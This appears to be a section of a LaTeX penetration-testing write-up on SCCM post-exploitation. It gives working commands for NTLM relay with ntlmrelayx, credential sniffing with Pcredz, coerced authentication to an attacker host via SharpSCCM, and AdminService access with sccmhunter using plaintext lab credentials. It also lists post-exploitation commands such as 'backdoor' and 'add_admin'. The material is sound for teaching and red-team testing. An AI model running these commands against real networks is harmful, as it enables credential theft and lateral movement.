\section{Post exploitation}

\subsection{Applications and scripts deployment}

In this final step you can chose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:
\begin{itemize}
    \item 
        Coercing an authentication might be stealthier (and requires less cleanup) than installing an application
    \item
        To capture and relay NTLM credentials, the target device must support NTLM (very likely).
    \item
        The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)
\end{itemize}

\begin{verbatim}
# Prep capturing server
## ntlmrelayx targeting 10.250.2.179
ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179

# Also keep Pcredz running, just in case
Pcredz -i enp0s8 -t
\end{verbatim}

Note that the incoming authentication requsts might take a while (couple minutes) to roll in...


\begin{verbatim}
SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
\end{verbatim}




\subsection{AdminService lateral movement}
The CMPivot service, presents on the MP server, permits to enumerate all the resources (installed softwares, local administrators, hardware specification, and so on) of a computer, or a computer collection, and perform administrative tasks on them. It uses a HTTP REST API, named AdminService, provided by the SMS Provider server which.

With SCCM administrative rights, it is possible to directly interact with the AdminService API, without using CMPivot, for post SCCM exploitation purpose.

\begin{verbatim}
python3 sccmhunter.py admin -debug -u 'haas.local\jubeaz' -p jubeaz -ip bran.haas.local
\end{verbatim}

hen, the help command can be typed in the opened shell to view all the CMPivot commands handled by sccmhunter.
\begin{verbatim}
() C:\ >> help

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

Database Commands
=================
get_collection  get_device  get_lastlogon  get_puser  get_user

Interface Commands
==================
exit  interact

PostEx Commands
===============
add_admin  backdoor  backup  delete_admin  restore  script

Situational Awareness Commands
==============================
administrators  console_users  ipconfig   osinfo    sessions
cat             disk           list_disk  ps        shares  
cd              environment    ls         services  software
\end{verbatim}



